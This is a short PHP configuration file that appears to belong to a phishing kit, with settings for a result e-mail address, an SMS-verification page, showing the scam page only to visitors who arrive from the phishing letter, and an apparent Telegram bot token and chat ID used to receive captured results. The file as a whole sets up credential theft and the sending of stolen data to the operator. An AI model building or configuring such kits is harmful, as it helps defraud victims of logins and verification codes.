<?php 
//INFO By LYL-G
$em   = ""; // <-- Rslt E-mail
$rzhtm = "off"; // Text rslt on/off
$pgsms = "yes"; // <-- SMS verification yes/no
$shows="yes"; //Show SCM to only who comes from Letter yes/no
//API
$api="933360716:AAFBNgwB-7gqiy9XdtxRFcCJ4gMNkWFdW3Q";
$id="1071344219";
?>